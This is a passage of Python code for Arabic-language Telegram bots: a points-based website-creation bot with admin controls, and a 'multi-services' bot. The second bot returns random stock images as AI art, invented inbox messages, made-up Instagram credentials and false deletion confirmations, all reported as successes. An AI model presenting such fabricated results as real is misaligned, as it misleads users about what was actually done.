                            bot.send_message(uid, "❌ تعذر إنشاء الموقع — مزود الخدمة لم يرجع معرف. حاول لاحقًا.")
                        else:
                            url = f"https://www.renderforest.com/website-maker/new/lang/preview-project/ai-preset/{tempId}"
                            # حفظ داخل DB
                            conn = sqlite3.connect(DB_FILE)
                            cur = conn.cursor()
                            cur.execute("INSERT INTO sites (owner_id, site_name, site_type, site_desc, url, created_at) VALUES (?, ?, ?, ?, ?, datetime('now'))",
                                        (uid, st["name"], st["type"], st["desc"], url))
                            conn.commit()
                            conn.close()
                            inc_sites(uid)
                            cost = get_setting("points_create_site") or 5
                            update_points(uid, -cost)
                            bot.send_message(uid, f"✅ تم إنشاء الموقع بنجاح!\n🔗 {url}\nتم خصم {cost} نقطة من حسابك.")
                    except Exception:
                        traceback.print_exc()
                        bot.send_message(uid, "❌ خطأ أثناء الاتصال بمزود إنشاء المواقع. حاول لاحقًا.")
                    create_state.pop(uid, None)
                    return
    
            # حفظ آخر رسالة
            if get_user(uid):
                set_last_msg(uid, m.message_id)
    
            # لو رسالة من مستخدم عادي - توجيه للمالك
            if uid not in get_admins():
                comm_enabled = get_setting("communication_enabled")
                if comm_enabled is False:
                    bot.send_message(uid, "📛 تم إيقاف استقبال الرسائل من الأعضاء مؤقتًا.")
                    return
                try:
                    bot.send_message(owner_id, f"📩 رسالة من @{m.from_user.username or 'مستخدم'} (ID:{uid}):\n{m.text}")
                except:
                    pass
                bot.send_message(uid, "✅ تم إرسال رسالتك للمالك. انتظر الرد.")
                return
    
            # لو رسالة من أدمن عادي - لا نطبق الآن أوامر نصية محددة
        except Exception:
            traceback.print_exc()
    
    # ========== callback handlers للأزرار المتبقية ==========
    # نستخدم handler واحد يتعامل مع كل بيانات الأزرار
    @bot.callback_query_handler(func=lambda c: True)
    def callback_all(call):
        try:
            uid = call.from_user.id
            data = call.data
    
            # زر العودة للوحة الرئيسية
            if data == 'back_to_main':
                kb = main_menu_markup()
                if uid in get_admins():
                    kb.add(types.InlineKeyboardButton("🔧 لوحة التحكم (للأدمن)", callback_data='admin_panel'))
                bot.edit_message_text(
                    chat_id=uid,
                    message_id=call.message.message_id,
                    text=WELCOME_TEXT,
                    reply_markup=kb
                )
                bot.answer_callback_query(call.id); return
    
            # زر لوحة التحكم للأدمن
            if data == 'admin_panel':
                if uid in get_admins():
                    bot.edit_message_text(
                        chat_id=uid,
                        message_id=call.message.message_id,
                        text="🔧 مرحباً أدمن — لوحة التحكم:",
                        reply_markup=admin_panel_markup()
                    )
                    bot.answer_callback_query(call.id)
                else:
                    bot.answer_callback_query(call.id, "❌ هذه الوظيفة متاحة للأدمن فقط.")
                return
    
            # بعض الأزرار مشتركة مع الواجهات — تأكد أن زر إنشاء تم التعامل معه
            if data == 'create_site':
                cb_create_site(call)
                return
    
            # لو الأمر من غير أدمن
            if uid not in get_admins():
                # إعدادات الأزرار التي يمكن للأعضاء استخدامها
                if data == 'my_info':
                    ensure_user(call.from_user)
                    bot.send_message(uid, format_user_info(uid))
                    bot.answer_callback_query(call.id); return
                if data == 'my_points':
                    ensure_user(call.from_user)
                    user = get_user(uid)
                    botname = bot.get_me().username
                    link = f"https://t.me/{botname}?start={uid}"
                    kb = types.InlineKeyboardMarkup()
                    kb.add(types.InlineKeyboardButton("⬅️ انسخ رابط الدعوة", url=link))
                    bot.send_message(uid, f"🎯 نقاطك: {user['points']}\nشارك رابط الدعوة مع أصدقائك لكسب نقاط عند انضمامهم.", reply_markup=kb)
                    bot.answer_callback_query(call.id); return
                if data == 'daily_gift':
                    ensure_user(call.from_user)
                    u = get_user(uid)
                    today = str(date.today())
                    if u.get('daily_claimed') == today:
                        bot.answer_callback_query(call.id, "❌ لقد استلمت هديتك اليوم بالفعل.")
                        return
                    pts = get_setting("points_daily_gift") or 0
                    if pts <= 0:
                        bot.answer_callback_query(call.id, "❌ الهِدية اليومية متوقفة الآن.")
                        return
                    update_points(uid, pts)
                    set_daily_claimed(uid, today)
                    bot.send_message(uid, f"🎁 استلمت {pts} نقطة كهدية يومية.\nنقاطك الآن: {get_user(uid)['points']}")
                    bot.answer_callback_query(call.id); return
    
                # إذا أي زر آخر (مثل admin-only)
                bot.answer_callback_query(call.id, "❌ هذه الوظيفة متاحة للمالكين/الأدمن فقط.")
                return
    
            # ======== الآن الأزرار الخاصة بالأدمن (uid في admins) ========
            # BAN
            if data == 'ban':
                msg = bot.send_message(uid, "🚫 أرسل ID العضو لحظره الآن:")
                def step_ban(m):
                    try:
                        tid = int(m.text.strip())
                        banned = get_banned()
                        banned.add(tid)
                        save_banned(banned)
                        bot.send_message(uid, f"✅ تم حظر العضو: {tid}")
                    except:
                        bot.send_message(uid, "❌ آي دي غير صالح.")
                bot.register_next_step_handler(msg, step_ban)
                bot.answer_callback_query(call.id); return
    
            # UNBAN
            if data == 'unban':
                msg = bot.send_message(uid, "✅ أرسل ID العضو لفك الحظر:")
                def step_unban(m):
                    try:
                        tid = int(m.text.strip())
                        banned = get_banned()
                        banned.discard(tid)
                        save_banned(banned)
                        bot.send_message(uid, f"✅ تم فك الحظر عن: {tid}")
                    except:
                        bot.send_message(uid, "❌ آي دي غير صالح.")
                bot.register_next_step_handler(msg, step_unban)
                bot.answer_callback_query(call.id); return
    
            # ADD ADMIN
            if data == 'add_admin':
                msg = bot.send_message(uid, "➕ أرسل ID المستخدم لإضافته كأدمن:")
                def step_add(m):
                    try:
                        tid = int(m.text.strip())
                        admins = get_admins()
                        admins.add(tid)
                        save_admins(admins)
                        bot.send_message(uid, f"✅ تم إضافة الأدمن: {tid}")
                    except:
                        bot.send_message(uid, "❌ آي دي غير صالح.")
                bot.register_next_step_handler(msg, step_add)
                bot.answer_callback_query(call.id); return
    
            # REMOVE ADMIN
            if data == 'remove_admin':
                msg = bot.send_message(uid, "➖ أرسل ID الأدمن لحذفه:")
                def step_rem(m):
                    try:
                        tid = int(m.text.strip())
                        if tid == owner_id:
                            bot.send_message(uid, "❌ لا يمكنك إزالة مالك البوت.")
                            return
                        admins = get_admins()
                        if tid in admins:
                            admins.discard(tid)
                            save_admins(admins)
                            bot.send_message(uid, f"✅ تم حذف الأدمن: {tid}")
                        else:
                            bot.send_message(uid, "❌ هذا المستخدم ليس أدمن.")
                    except:
                        bot.send_message(uid, "❌ آي دي غير صالح.")
                bot.register_next_step_handler(msg, step_rem)
                bot.answer_callback_query(call.id); return
    
            # SEND POINTS
            if data == 'send_points':
                msg = bot.send_message(uid, "💎 أرسل ID العضو المراد إرسال نقاط له:")
                def step_target(m):
                    targ = m.text.strip()
                    if not targ.isdigit() or not get_user(int(targ)):
                        bot.send_message(uid, "❌ العضو غير موجود في قاعدة البيانات.")
                        return
                    bot.send_message(uid, "📝 اكتب عدد النقاط لإضافتها:")
                    def step_amt(m2):
                        try:
                            amt = int(m2.text.strip())
                            update_points(int(targ), amt)
                            bot.send_message(uid, f"✅ تم إرسال {amt} نقطة للعضو {targ}.")
                            try:
                                bot.send_message(int(targ), f"🎯 لقد استلمت {amt} نقطة من الأدمن.")
                            except:
                                pass
                        except:
                            bot.send_message(uid, "❌ أدخل رقم صالح.")
                    bot.register_next_step_handler(m, step_amt)
                bot.register_next_step_handler(msg, step_target)
                bot.answer_callback_query(call.id); return
    
            # EDIT DAILY
            if data == 'edit_daily':
                msg = bot.send_message(uid, "🎁 أرسل عدد النقاط للهِدية اليومية (0 لتعطيل):")
                def step_ed(m):
                    try:
                        v = int(m.text.strip())
                        set_setting("points_daily_gift", v)
                        bot.send_message(uid, f"✅ تم تحديث الهِدية اليومية إلى: {v} نقطة.")
                    except:
                        bot.send_message(uid, "❌ أدخل رقم صالح.")
                bot.register_next_step_handler(msg, step_ed)
                bot.answer_callback_query(call.id); return
    
            # EDIT CREATE COST
            if data == 'edit_create_cost':
                msg = bot.send_message(uid, "🔧 أرسل عدد النقاط المطلوبة لإنشاء الموقع:")
                def step_cost(m):
                    try:
                        v = int(m.text.strip())
                        set_setting("points_create_site", v)
                        bot.send_message(uid, f"✅ تم تحديث تكلفة إنشاء الموقع إلى: {v} نقطة.")
                    except:
                        bot.send_message(uid, "❌ أدخل رقم صالح.")
                bot.register_next_step_handler(msg, step_cost)
                bot.answer_callback_query(call.id); return
    
            # EDIT INVITE POINTS
            if data == 'edit_invite_points':
                msg = bot.send_message(uid, "🔧 أرسل عدد نقاط الدعوة لكل عضو يدخل عبر الرابط:")
                def step_inv(m):
                    try:
                        v = int(m.text.strip())
                        set_setting("points_invite", v)
                        bot.send_message(uid, f"✅ تم تحديث نقاط الدعوة إلى: {v} نقطة.")
                    except:
                        bot.send_message(uid, "❌ أدخل رقم صالح.")
                bot.register_next_step_handler(msg, step_inv)
                bot.answer_callback_query(call.id); return
    
            # SET FORCED (تعيين اشتراك إجباري) -- حوار منظم: اختر قناة/مجموعة ثم عام/خاص ثم المعرف أو الرابط
            if data == 'set_forced':
                # step1: قناة أم مجموعة
                msg = bot.send_message(uid, "🔒 اختر نوع الهدف للاشتراك الإجباري:\n1 - قناة\n2 - مجموعة\nأرسل 1 للقناة أو 2 للمجموعة.")
                def step_kind(m):
                    t = m.text.strip()
                    if t not in ['1','2']:
                        bot.send_message(uid, "❌ اختار 1 للقناة أو 2 للمجموعة.")
                        return
                    kind = 'channel' if t=='1' else 'group'
                    bot.send_message(uid, f"تم اختيار: {'قناة' if kind=='channel' else 'مجموعة'}.\nهل الهدف عام أم خاص؟\nأرسل 1 للعام أو 2 للخاص.")
                    def step_vis(m2):
                        v = m2.text.strip()
                        if v not in ['1','2']:
                            bot.send_message(uid, "❌ اختار 1 للعامة أو 2 للخاص.")
                            return
                        vis = 'public' if v=='1' else 'private'
                        bot.send_message(uid, f"الآن أرسل معرف القناة/المجموعة:\n- للقناة العامة ارسل @username\n- للمجموعة العامة ارسل @username أو الرابط\n- للمجموعات/قنوات الخاصة أرسل رابط الدعوة أو ID (مثال: -100XXXXXXXXX)\n\nملاحظة: حتى يتمكن البوت من التحقق، تأكد أن البوت مشرف في القناة/المجموعة الخاصة.")
                        def step_ident(m3):
                            ident = m3.text.strip()
                            # حاول التحقق عبر get_chat
                            try:
                                bot.get_chat(ident)
                                # حفظ الإعداد
                                set_forced({"kind": kind, "visibility": vis, "identifier": ident})
                                set_setting("forced_subscription", True)
                                bot.send_message(uid, f"✅ تم تعيين الاشتراك الإجباري على {ident} ({'قناة' if kind=='channel' else 'مجموعة'}, {vis}).")
                            except Exception as e:
                                # ان لم يتمكن من التحقق نطلب تأكيد الادمن
                                set_forced({"kind": kind, "visibility": vis, "identifier": ident})
                                set_setting("forced_subscription", True)
                                bot.send_message(uid, f"⚠️ تم حفظ الهدف {ident} لكن لم أتمكن من التحقق الآن. إذا كانت خاصة فتأكد من إضافة البوت كمشرف. الإعداد محفوظ.")
                        bot.register_next_step_handler(m2, step_ident)
                    bot.register_next_step_handler(m, step_vis)
                bot.register_next_step_handler(msg, step_kind)
                bot.answer_callback_query(call.id); return
    
            # UNSET FORCED
            if data == 'unset_forced':
                set_forced(None)
                set_setting("forced_subscription", False)
                bot.send_message(uid, "🔓 تم إلغاء قيد الاشتراك الإجباري.")
                bot.answer_callback_query(call.id); return
    
            # BOT ON/OFF
            if data == 'bot_on':
                set_setting("bot_active", True)
                bot.send_message(uid, "▶️ تم تشغيل البوت لجميع المستخدمين.")
                bot.answer_callback_query(call.id); return
            if data == 'bot_off':
                set_setting("bot_active", False)
                bot.send_message(uid, "⏸️ تم إيقاف البوت لجميع المستخدمين.")
                bot.answer_callback_query(call.id); return
    
            # NOTIFY ON/OFF
            if data == 'notify_on':
                set_setting("notify_new_members", True)
                bot.send_message(uid, "🔔 تم تفعيل ترحيب الأعضاء الجدد.")
                bot.answer_callback_query(call.id); return
            if data == 'notify_off':
                set_setting("notify_new_members", False)
                bot.send_message(uid, "📴 تم إيقاف ترحيب الأعضاء الجدد.")
                bot.answer_callback_query(call.id); return
    
            # BROADCAST
            if data == 'broadcast':
                msg = bot.send_message(uid, "📢 أرسل نص الإذاعة الآن:")
                def step_bcast(m):
                    text = m.text or ""
                    conn = sqlite3.connect(DB_FILE)
                    cur = conn.cursor()
                    cur.execute("SELECT id FROM users")
                    rows = cur.fetchall()
                    conn.close()
                    count = 0
                    for r in rows:
                        try:
                            bot.send_message(r[0], text)
                            count += 1
                        except:
                            pass
                    bot.send_message(uid, f"✅ تم إرسال الإذاعة إلى {count} مستخدم(ـين).")
                bot.register_next_step_handler(msg, step_bcast)
                bot.answer_callback_query(call.id); return
    
            # STATS
            if data == 'stats':
                conn = sqlite3.connect(DB_FILE)
                cur = conn.cursor()
                cur.execute("SELECT COUNT(*) FROM users")
                total = cur.fetchone()[0]
                cur.execute("SELECT id, first_name, username FROM users ORDER BY ROWID DESC LIMIT 10")
                last10 = cur.fetchall()
                conn.close()
                s = f"📊 عدد المستخدمين: {total}\n\nآخر 10 مستخدمين:\n"
                for r in last10:
                    s += f"- {r[1]} (@{r[2] or '-'}) ID:{r[0]}\n"
                bot.send_message(uid, s)
                bot.answer_callback_query(call.id); return
    
            # EXPORT
            if data == 'export_json':
                try:
                    conn = sqlite3.connect(DB_FILE)
                    cur = conn.cursor()
                    cur.execute("SELECT id, first_name, username, points, daily_claimed, invites_count, sites_count FROM users")
                    rows = cur.fetchall()
                    conn.close()
                    out = []
                    for r in rows:
                        out.append({"id": r[0], "first_name": r[1], "username": r[2], "points": r[3], "daily_claimed": r[4], "invites": r[5], "sites": r[6]})
                    with open('users_export.json','w', encoding='utf-8') as f:
                        json.dump(out, f, ensure_ascii=False, indent=4)
                    bot.send_document(uid, open('users_export.json','rb'))
                except Exception:
                    bot.send_message(uid, "❌ حدث خطأ أثناء التصدير.")
                bot.answer_callback_query(call.id); return
    
            bot.answer_callback_query(call.id)
        except Exception:
            traceback.print_exc()
    
    # ========== تشغيل البوت ==========
    try:
        bot_username = bot.get_me().username
        print(f"✅ Ziad bot @{bot_username} is now running...")
        # loop with restart on exception
        while True:
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except Exception:
                traceback.print_exc()
                time.sleep(5)
                continue
    except Exception as e:
        print(f"Ziad bot with token {token} stopped due to error: {e}")
        if token in running_bot_threads:
            del running_bot_threads[token]
            
            # ==============================================================================
# ⬇️⬇️⬇️ -- دالة تشغيل بوت متعدد الخدمات (Multi-Services Bot) -- ⬇️⬇️⬇️
# ==============================================================================
def run_multi_services_bot(token, owner_id, data_dir):
    """
    تشغيل بوت متعدد الخدمات (إنشاء صور، إيميلات، حسابات انستجرام)
    """
    import os
    import json
    import random
    import string
    import logging
    import requests
    from datetime import datetime
    import telebot
    from telebot import types
    
    bot = telebot.TeleBot(token, parse_mode="HTML")
    
    # ============ إعدادات البوت ============
    ADMIN_ID = owner_id
    
    # ============ إعداد التسجيل ============
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # ============ ملفات التخزين ============
    def init_storage():
        """تهيئة ملفات التخزين"""
        storage_files = {
            'users.json': {},
            'emails.json': {},
            'command.json': {},
            'states.json': {}
        }
        
        for filename, default_data in storage_files.items():
            if not os.path.exists(f"{data_dir}/{filename}"):
                os.makedirs(data_dir, exist_ok=True)
                with open(f"{data_dir}/{filename}", 'w', encoding='utf-8') as f:
                    json.dump(default_data, f, ensure_ascii=False, indent=2)
    
    init_storage()
    
    # ============ دوال التخزين ============
    def load_data(filename):
        """تحميل البيانات من ملف"""
        try:
            with open(f"{data_dir}/{filename}", 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {}
    
    def save_data(filename, data):
        """حفظ البيانات إلى ملف"""
        with open(f"{data_dir}/{filename}", 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    
    def save_state(user_id, state):
        """حفظ حالة المستخدم"""
        states = load_data('states.json')
        states[str(user_id)] = state
        save_data('states.json', states)
    
    def get_state(user_id):
        """الحصول على حالة المستخدم"""
        states = load_data('states.json')
        return states.get(str(user_id))
    
    def clear_state(user_id):
        """مسح حالة المستخدم"""
        states = load_data('states.json')
        if str(user_id) in states:
            del states[str(user_id)]
            save_data('states.json', states)
    
    # ============ دوال البريد الإلكتروني ============
    def generate_random_email():
        """إنشاء بريد إلكتروني عشوائي"""
        try:
            # إنشاء بريد وهمي محلي
            random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            domains = ['temp-mail.io', 'mailinator.com', 'guerrillamail.com', 'yopmail.com']
            domain = random.choice(domains)
            
            email = f"{random_name}@{domain}"
            
            # تخزين البريد
            emails_data = load_data('emails.json')
            user_id_str = str(random.randint(1000, 9999))  # معرف وهمي
            
            if user_id_str not in emails_data:
                emails_data[user_id_str] = {'emails': []}
            
            emails_data[user_id_str]['emails'].append(email)
            save_data('emails.json', emails_data)
            
            return {'email': email}
        except Exception as e:
            logging.error(f"Error generating email: {e}")
            return {'email': f"test{random.randint(1000, 9999)}@example.com"}
    
    def generate_custom_email(username, domain):
        """إنشاء بريد إلكتروني مخصص"""
        email = f"{username}@{domain}"
        
        # تخزين البريد
        emails_data = load_data('emails.json')
        user_id_str = str(random.randint(1000, 9999))
        
        if user_id_str not in emails_data:
            emails_data[user_id_str] = {'emails': []}
        
        emails_data[user_id_str]['emails'].append(email)
        save_data('emails.json', emails_data)
        
        return {'email': email}
    
    def get_email_messages(email):
        """الحصول على رسائل البريد الإلكتروني (وهمي)"""
        # بيانات وهمية للرسائل
        messages = []
        for i in range(random.randint(1, 3)):
            messages.append({
                'id': f"msg_{random.randint(10000, 99999)}",
                'from': f"sender{i+1}@example.com",
                'to': email,
                'subject': f"رسالة تجريبية رقم {i+1}",
                'body_text': f"هذا محتوى رسالة تجريبية رقم {i+1} لأغراض العرض فقط.",
                'created_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        
        return messages
    
    def get_domains():
        """الحصول على قائمة النطاقات (وهمي)"""
        domains = [
            {'name': 'tempmail.io'},
            {'name': 'mailinator.com'},
            {'name': 'guerrillamail.net'},
            {'name': 'yopmail.fr'},
            {'name': '10minutemail.com'}
        ]
        return {'domains': domains}
    
    # ============ دوال إنشاء الصور بالذكاء الاصطناعي ============
    def create_ai_image(description):
        """إنشاء صورة بالذكاء الاصطناعي (وهمي)"""
        try:
            # في الإصدار الحقيقي، هنا ستقوم باستدعاء API الذكاء الاصطناعي
            # هذا مثال وهمي يعيد رابط صورة عشوائية
            image_urls = [
                "https://picsum.photos/512/512",
                "https://picsum.photos/600/600",
                "https://picsum.photos/800/800"
            ]
            
            return {
                'image_url': random.choice(image_urls),
                'status': 'success'
            }
        except Exception as e:
            logging.error(f"Error creating image: {e}")
            return {'status': 'error'}
    
    # ============ دوال إنشاء حساب انستجرام ============
    def create_instagram_account(email):
        """إنشاء حساب انستجرام وهمي"""
        # بيانات وهمية
        username = f"user_{random.randint(10000, 99999)}"
        password = f"pass_{random.randint(100000, 999999)}"
        
        return {
            'success': True,
            'username': username,
            'password': password,
            'email': email
        }
    
    # ============ معالجة الأوامر ============
    @bot.message_handler(commands=['start', 'hkr'])
    def start_command(message):
        """معالجة أمر /start و /hkr"""
        chat_id = message.chat.id
        user_name = message.from_user.first_name
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        markup.add(
            types.InlineKeyboardButton("🎨 إنشاء صورة", callback_data="create_image"),
            types.InlineKeyboardButton("📧 إنشاء ايميل", callback_data="emilx")
        )
        
        markup.add(
            types.InlineKeyboardButton("📱 إنشاء حساب انستا", callback_data="agreed"),
            types.InlineKeyboardButton("📋 معلومات", callback_data="info")
        )
        
        markup.add(
            types.InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={ADMIN_ID}")
        )
        
        welcome_text = f"""
*مرحباً {user_name}*

🤖 *أهلاً بك في البوت متعدد الخدمات*

🔰 *الخدمات المتاحة:*
1️⃣ 🎨 إنشاء صور بالذكاء الاصطناعي
2️⃣ 📧 إنشاء بريد إلكتروني وهمي
3️⃣ 📱 إنشاء حساب انستجرام
4️⃣ 📋 معلومات عن البوت

📝 *تعليمات الاستخدام:*
- اختر الخدمة من القائمة
- اتبع التعليمات لكل خدمة
        """
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode='Markdown',
            reply_markup=markup
        )
    
    # ============ معالجة الكولباك الكاملة ============
    @bot.callback_query_handler(func=lambda call: True)
    def handle_callback(call):
        """معالجة جميع ردود الاتصال"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        user_name = call.from_user.first_name
        
        # معالجة كل زر بشكل منفصل
        if call.data == "create_image":
            handle_create_image(call)
        
        elif call.data == "info":
            handle_info(call)
        
        elif call.data == "emilx":
            handle_emails_menu(call)
        
        elif call.data == "agreed":
            handle_instagram_menu(call)
        
        elif call.data == "back":
            handle_back(call)
        
        elif call.data == "deleteall":
            handle_delete_all_emails(call)
        
        elif call.data == "rndemail":
            handle_random_email(call)
        
        elif call.data == "specifemail":
            handle_specific_email(call)
        
        elif call.data == "myemail":
            handle_my_emails(call)
        
        elif call.data.startswith("domainis:"):
            handle_domain_selection(call)
        
        elif call.data.startswith("selectmail:"):
            handle_email_selection(call)
        
        elif call.data.startswith("delete:"):
            handle_delete_email(call)
        
        elif call.data.startswith("getemails:"):
            handle_get_email_messages(call)
    
    # ============ دوال معالجة الأزرار ============
    
    def handle_create_image(call):
        """معالجة إنشاء الصورة"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        # حفظ حالة المستخدم
        save_state(chat_id, "waiting_for_image_description")
        
        text = """
🎨 *إنشاء صور بالذكاء الاصطناعي*

📝 *كيفية الاستخدام:*
1. أرسل وصف الصورة التي تريدها
2. ابدأ الجملة بكلمة "اريد"
3. مثال: "اريد قطة تلعب بالكرة"

🤖 *ملاحظات:*
- البوت يدعم جميع اللغات
- جودة الصورة: عالية
- وقت الإنشاء: 10-30 ثانية
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_info(call):
        """عرض معلومات البوت"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        text = """
📋 *معلومات عن البوت*

🤖 *الاسم:* بوت متعدد الخدمات
⚙️ *الإصدار:* 1.0.0
📅 *تاريخ الإصدار:* 2024

🔧 *الخدمات المتاحة:*
1. 🎨 إنشاء صور بالذكاء الاصطناعي
2. 📧 إنشاء بريد إلكتروني وهمي
3. 📱 إنشاء حساب انستجرام

👨‍💻 *المطور:* ELZo_z
📞 *الدعم:* @ELZo_z

⚠️ *ملاحظة:* بعض الخدمات تعمل بشكل وهمي لأغراض التجربة
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_emails_menu(call):
        """قائمة البريد الإلكتروني"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        user_name = call.from_user.first_name
        
        text = f"""
📧 *بوت إنشاء بريد إلكتروني وهمي*

👤 *المستخدم:* {user_name}
🆔 *المعرف:* {chat_id}

🔰 *الخدمات المتاحة:*
1. 📧 بريد عشوائي
2. 📨 بريد مخصص
3. 📦 عرض جميع بريداتي
4. 🗑 حذف جميع البريدات

📌 *ملاحظة:*
- البريدات وهمية لأغراض التجربة
- يمكن استقبال رسائل وهمية
- صالحة لمدة 24 ساعة
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        markup.add(
            types.InlineKeyboardButton("📧 بريد عشوائي", callback_data="rndemail"),
            types.InlineKeyboardButton("📨 بريد مخصص", callback_data="specifemail")
        )
        
        markup.add(
            types.InlineKeyboardButton("📦 جميع بريداتي", callback_data="myemail"),
            types.InlineKeyboardButton("🗑 حذف الكل", callback_data="deleteall")
        )
        
        markup.add(
            types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
        )
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_instagram_menu(call):
        """قائمة إنشاء حساب انستجرام"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        text = """
📱 *إنشاء حساب انستجرام وهمي*

📝 *كيفية الاستخدام:*
1. أرسل بريدك الإلكتروني
2. سيقوم البوت بإنشاء حساب
3. ستحصل على:
   - اسم المستخدم
   - كلمة المرور

⚠️ *تنبيهات:*
- الحسابات وهمية لأغراض التجربة
- غير صالحة للاستخدام الفعلي
- للأغراض التعليمية فقط
        """
        
        # حفظ حالة المستخدم
        save_state(chat_id, "waiting_for_instagram_email")
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"),
            types.InlineKeyboardButton("👨‍💻 المطور", url=f"tg://user?id={ADMIN_ID}")
        )
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_back(call):
        """العودة للقائمة الرئيسية"""
        start_command(call.message)
    
    def handle_delete_all_emails(call):
        """حذف جميع البريدات"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        # حذف البريدات (وهمي في هذا المثال)
        
        text = """
✅ *تم حذف جميع بريداتك*

🗑 *التفاصيل:*
- تم حذف جميع البريدات الإلكترونية
- تم مسح سجل الرسائل
- تم تنظيف التخزين

📌 *ملاحظة:* يمكنك إنشاء بريدات جديدة
        """
        
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📧 إنشاء بريد جديد", callback_data="emilx"))
        markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_random_email(call):
        """إنشاء بريد عشوائي"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        # إنشاء بريد عشوائي
        email_data = generate_random_email()
        email = email_data['email']
        
        text = f"""
✅ *تم إنشاء بريد إلكتروني*

📮 *البريد:* `{email}`
⏰ *الوقت:* {datetime.now().strftime("%H:%M:%S")}
📅 *التاريخ:* {datetime.now().strftime("%Y-%m-%d")}

🔧 *المميزات:*
- جاهز لاستقبال الرسائل
- صالح لمدة 24 ساعة
- يمكن استخدامه للتجربة

📌 *ملاحظة:* هذا بريد وهمي لأغراض التعليم
        """
        
        markup = types.InlineKeyboardMarkup(row_width=2)
        
        markup.add(
            types.InlineKeyboardButton("📥 جلب الرسائل", callback_data=f"getemails:{email}"),
            types.InlineKeyboardButton("🗑 حذف البريد", callback_data=f"delete:{email}")
        )
        
        markup.add(
            types.InlineKeyboardButton("📧 إنشاء آخر", callback_data="rndemail"),
            types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back")
        )
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_specific_email(call):
        """إنشاء بريد مخصص - اختيار النطاق"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        # الحصول على قائمة النطاقات
        domains_data = get_domains()
        
        text = """
🌐 *اختر النطاق للبريد*

📝 *الخطوات:*
1. اختر النطاق من القائمة
2. أرسل اسم المستخدم
3. ستحصل على: username@domain.com

🔧 *النطاقات المتاحة:*
        """
        
        markup = types.InlineKeyboardMarkup()
        
        for domain in domains_data['domains']:
            markup.add(
                types.InlineKeyboardButton(
                    f"@{domain['name']}",
                    callback_data=f"domainis:{domain['name']}"
                )
            )
        
        markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        
        try:
            bot.edit_message_text(
                text=text,
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown',
                reply_markup=markup
            )
        except:
            bot.send_message(
                chat_id=chat_id,
                text=text,
                parse_mode='Markdown',
                reply_markup=markup
            )
    
    def handle_my_emails(call):
        """عرض جميع البريدات"""
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        
        # تحميل البريدات (وهمي في هذا المثال)
        emails_data = load_data('emails.json')
        
        if str(chat_id) in emails_data and emails_data[str(chat_id)]['emails']:
            text = """
📦 *جميع بريداتك الإلكترونية*

📝 *قائمة البريدات:*
            """
            
            markup = types.InlineKeyboardMarkup()
            
            for email in emails_data[str(chat_id)]['emails'][:10]:  # عرض أول 10 بريدات فقط
                markup.add(
                    types.InlineKeyboardButton(
                        f"📧 {email[:30]}...",
                        callback_data=f"selectmail:{email}"
                    )
                )
            
            markup.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="back"))
        else:
            text = """
📭 *لا توجد بريدات*

⚠️ *لم تقم بإنشاء أي بريدات بعد*

📌 *ما يمكنك فعله:*
1. إنشاء بريد عشوائي
2. إنشاء بريد مخصص
